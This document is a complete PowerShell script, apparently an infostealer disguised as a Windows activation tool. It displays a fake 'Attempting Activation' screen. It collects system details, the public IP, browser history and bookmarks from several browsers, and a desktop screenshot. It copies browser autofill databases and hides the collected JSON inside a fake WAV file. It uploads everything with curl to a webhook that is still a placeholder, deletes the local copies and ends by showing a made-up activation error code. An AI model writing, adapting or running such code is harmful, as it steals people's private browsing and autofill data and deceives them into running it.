$WebhookUrl = "SET-WEBHOOK"
$jsonFilePath = "C:\Users\$env:USERNAME\Desktop\tempfile.json"
$wavFilePath = "C:\Users\$env:USERNAME\Desktop\output_file.wav"
$Path = "C:\Users\$env:USERNAME\Desktop"

clear
$OS = Get-WmiObject -class Win32_OperatingSystem
$OS_Version = $OS.Version
$OS_BuildNumber = $OS.BuildNumber
$OS_SerialNumber = $OS.SerialNumber
$OS_Manufacturer = $OS.Manufacturer
Write-Host "Attempting Activation..." -ForegroundColor Cyan
Write-Host "Property           | Value" -ForegroundColor Cyan
Write-Host "-------------------|-----------------------"
$formatString = "{0,-18} | {1}"
Write-Host ($formatString -f "OS Version", $OS_Version)
Write-Host ($formatString -f "Build Number", $OS_BuildNumber)
Write-Host ($formatString -f "Serial Number", $OS_SerialNumber)
Write-Host ($formatString -f "Manufacturer", $OS_Manufacturer)
function Convert-JsonToWav {
    param(
        [Parameter(Mandatory=$true)]
        [string]$jsonFilePath,

        [Parameter(Mandatory=$true)]
        [string]$wavFilePath
    )

    $jsonContent = Get-Content -Path $jsonFilePath -Raw
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonContent)

    $fileSize = 44 + $dataBytes.Length

    $header = New-Object byte[] 44
    $encoding = [System.Text.Encoding]::ASCII
    $chunkSize = $fileSize - 8
    $format = 1
    $channels = 1
    $sampleRate = 44100
    $bitsPerSample = 16
    $byteRate = $sampleRate * $channels * ($bitsPerSample / 8)
    $blockAlign = $channels * ($bitsPerSample / 8)
    $subchunk2Size = $dataBytes.Length
    $encoding.GetBytes("RIFF").CopyTo($header, 0)
    [BitConverter]::GetBytes($chunkSize).CopyTo($header, 4)
    $encoding.GetBytes("WAVE").CopyTo($header, 8)
    $encoding.GetBytes("fmt ").CopyTo($header, 12)
    [BitConverter]::GetBytes(16).CopyTo($header, 16)
    [BitConverter]::GetBytes($format).CopyTo($header, 20)
    [BitConverter]::GetBytes($channels).CopyTo($header, 22)
    [BitConverter]::GetBytes($sampleRate).CopyTo($header, 24)
    [BitConverter]::GetBytes($byteRate).CopyTo($header, 28)
    [BitConverter]::GetBytes($blockAlign).CopyTo($header, 32)
    [BitConverter]::GetBytes($bitsPerSample).CopyTo($header, 34)
    $encoding.GetBytes("data").CopyTo($header, 36)
    [BitConverter]::GetBytes($subchunk2Size).CopyTo($header, 40)

    $wavData = $header + $dataBytes

    [System.IO.File]::WriteAllBytes($wavFilePath, $wavData)
}

function TakeScreenshot { 
    param([string]$FilePath)

    Add-Type -AssemblyName System.Windows.Forms
    $ScreenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $ScreenshotObject = New-Object System.Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
    $DrawingGraphics = [System.Drawing.Graphics]::FromImage($ScreenshotObject)
    $DrawingGraphics.CopyFromScreen($ScreenBounds.Location, [System.Drawing.Point]::Empty, $ScreenBounds.Size)
    $DrawingGraphics.Dispose()
    $ScreenshotObject.Save($FilePath)
    $ScreenshotObject.Dispose()
}

function Get-BrowserData-AutoFill {
    [CmdletBinding()]

    $browserDataTypes = @{
        chrome = 'autofill'
        edge = 'autofill'
        brave = 'autofill'
        opera = 'autofill'
    }

    foreach ($browser in $browserDataTypes.Keys) {
        $dataType = $browserDataTypes[$browser]
        $Path = $null

        switch ($browser) {
            'chrome' {
                $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data"
            }
            'edge' {
                $Path = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data"
            }
            'brave' {
                $Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
            }
            'opera' {
                $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Web Data"
            }
        }

        $destinationFilePath = Join-Path -Path $Env:USERPROFILE -ChildPath "Desktop\datafile-$browser-$dataType"

        if ($Path -and (Test-Path -Path $Path)) {
            Copy-Item -Path $Path -Destination $destinationFilePath
            curl.exe -s -S -F "file1=@$destinationFilePath" $WebhookUrl | Out-Null
            if (Test-Path $wavFilePath) {
                Remove-Item -Path $destinationFilePath -Force | Out-Null
            }
        } else {
        }
    }
}

function Get-BrowserData {
    [CmdletBinding()]
    param (    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"
    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    } elseif ($Browser -eq 'brave' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
    } elseif ($Browser -eq 'brave' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\History"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Bookmarks"
    }

    $Value = Get-Content -Path $Path -ErrorAction SilentlyContinue | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

$operabookmarks = Get-BrowserData -Browser "opera" -DataType "bookmarks"
$operahistory = Get-BrowserData -Browser "opera" -DataType "history"
$bravehistory = Get-BrowserData -Browser "brave" -DataType "history"
$bravebookmarks = Get-BrowserData -Browser "brave" -DataType "bookmarks"
$edgehistory = Get-BrowserData -Browser "edge" -DataType "history"
$edgebookmarks = Get-BrowserData -Browser "edge" -DataType "bookmarks"
$chromehistory = Get-BrowserData -Browser "chrome" -DataType "history"
$chromebookmarks = Get-BrowserData -Browser "chrome" -DataType "bookmarks"
$firefoxhistory = Get-BrowserData -Browser "firefox" -DataType "history"
$RAM = Get-WmiObject -Query "SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"
$totalRAM = [math]::Round($RAM.TotalVisibleMemorySize/1MB, 2)
$freeRAM = [math]::Round($RAM.FreePhysicalMemory/1MB, 2)
$usedRAM = [math]::Round(($RAM.TotalVisibleMemorySize - $RAM.FreePhysicalMemory)/1MB, 2)
$OS_Name = $OS.Caption
$OS_InstallDate = $OS.ConvertToDateTime($OS.InstallDate)
$OS_LastBootUpTime = $OS.ConvertToDateTime($OS.LastBootUpTime)
$OS_Architecture = $OS.OSArchitecture
$OS_SystemDrive = $OS.SystemDrive
$OS_WindowsDirectory = $OS.WindowsDirectory
$CS = Get-WmiObject -class Win32_ComputerSystem
$CS_Name = $CS.Name
$CS_Owner = $CS.PrimaryOwnerName
$CPU = Get-WmiObject -class Win32_Processor
$CPU_Name = $CPU.Name
$CPU_Manufacturer = $CPU.Manufacturer
$CPU_MaxClockSpeed = $CPU.MaxClockSpeed / 1000
$CPU_Used = (Get-WmiObject win32_processor).LoadPercentage
$CPU_Free = 100 - $CPU_Used
$Disk = Get-WmiObject -class Win32_LogicalDisk -Filter "DeviceID='C:'"
$Disk_ID = $Disk.DeviceID
$Disk_TotalSpace = [math]::Round($Disk.Size/1GB, 2)
$Disk_FreeSpace = [math]::Round($Disk.FreeSpace/1GB, 2)
$Disk_UsedSpace = [math]::Round(($Disk.Size - $Disk.FreeSpace)/1GB, 2)
#$systeminfo = Invoke-Expression "systeminfo"
$ipconfig = ipconfig
$driverquery = driverquery
$netstart = net start
$ip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/ip").Content

$infoprop = [ordered]@{
    'RAM_total'= $totalRAM
    'RAM_free'= $freeRAM
    'RAM_used'= $usedRAM
    'OS_Name'= $OS_Name
    'OS_InstallDate'= $OS_InstallDate
    'OS_LastBootUpTime'= $OS_LastBootUpTime
    'OS_Architecture'= $OS_Architecture
    'OS_SystemDrive'= $OS_SystemDrive
    'OS_WindowsDirectory'= $OS_WindowsDirectory
    'OS_BuildNumber'= $OS_BuildNumber
    'OS_SerialNumber'= $OS_SerialNumber
    'OS_Version'= $OS_Version
    'OS_Manufacturer'= $OS_Manufacturer
    'CS_Name'= $CS_Name
    'CS_Owner'= $CS_Owner
    'CPU_Name'= $CPU_Name
    'CPU_Manufacturer'= $CPU_Manufacturer
    'CPU_MaxClockSpeed'= $CPU_MaxClockSpeed
    'CPU_Used'= $CPU_Used
    'CPU_Free'= $CPU_Free
    'Disk_ID'= $Disk_ID
    'Disk_TotalSpace'= $Disk_TotalSpace
    'Disk_FreeSpace'= $Disk_FreeSpace
    'Disk_UsedSpace'= $Disk_UsedSpace

    'ipconfig'= $ipconfig
    'driverquery'= $driverquery
    'netstart'= $netstart
    'IP' = $ip
}
#    'systeminfo'= $systeminfo
$infoprop['EdgeBookmarks'] = $edgebookmarks
$infoprop['ChromeBookmarks'] = $chromebookmarks
$infoprop['OperaBookmarks'] = $operabookmarks
$infoprop['BraveBookmarks'] = $bravebookmarks
$infoprop['EdgeHistory'] = $edgehistory
$infoprop['ChromeHistory'] = $chromehistory
$infoprop['FirefoxHistory'] = $firefoxhistory
$infoprop['OperaHistory'] = $operahistory
$infoprop['BraveHistory'] = $bravehistory

$infoJson = $infoprop | ConvertTo-Json -Depth 10
$infoJson | Out-File -FilePath $jsonFilePath -Encoding UTF8
$fileName = [System.IO.Path]::GetFileName($jsonFilePath)
Convert-JsonToWav -jsonFilePath $jsonFilePath -wavFilePath $wavFilePath

$Time = Get-Date
$Filename = "$($Time.Year)-$($Time.Month)-$($Time.Day)T$($Time.Hour)-$($Time.Minute)-$($Time.Second).png"
$FilePath = Join-Path -Path $Path -ChildPath $Filename
TakeScreenshot -FilePath $FilePath

if (-not ([string]::IsNullOrEmpty($FilePath))) {
    curl.exe -s -S -F "file1=@$FilePath" $WebhookUrl | Out-Null
    if (Test-Path $FilePath) {
        Remove-Item -Path $FilePath -Force | Out-Null
    }
}

if (-not ([string]::IsNullOrEmpty($wavFilePath))) {
    curl.exe -s -S -F "file1=@$wavFilePath" $WebhookUrl | Out-Null
    if (Test-Path $wavFilePath) {
        Remove-Item -Path $wavFilePath -Force | Out-Null
    }
    if (Test-Path $jsonFilePath) {
        Remove-Item -Path $jsonFilePath -Force | Out-Null
    }
}

Get-BrowserData-AutoFill
clear
Write-Host "ActivationRegisterDistribution failed with error: 0x80070057"
Write-Host "Error: 0x80070057"

Write-Host -NoNewLine 'Press any key to continue...';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
exit
